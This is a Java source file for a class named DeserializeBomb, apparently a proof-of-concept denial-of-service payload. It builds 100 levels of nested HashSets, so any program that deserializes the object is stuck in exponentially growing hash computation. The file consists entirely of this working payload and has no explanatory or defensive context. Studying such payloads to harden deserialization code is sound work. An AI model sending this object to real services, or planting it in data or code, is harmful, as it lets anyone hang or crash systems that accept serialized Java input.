import java.io.Serializable;
import java.util.HashSet;
import java.util.Set;

public class DeserializeBomb implements Serializable {
    private Set<Object> bomb;
    DeserializeBomb(){
        bomb = bomb();
    }

    private static Set<Object> bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // Make t1 unequal to t2
            s1.add(t1); s1.add(t2);
            s2.add(t1); s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }
}
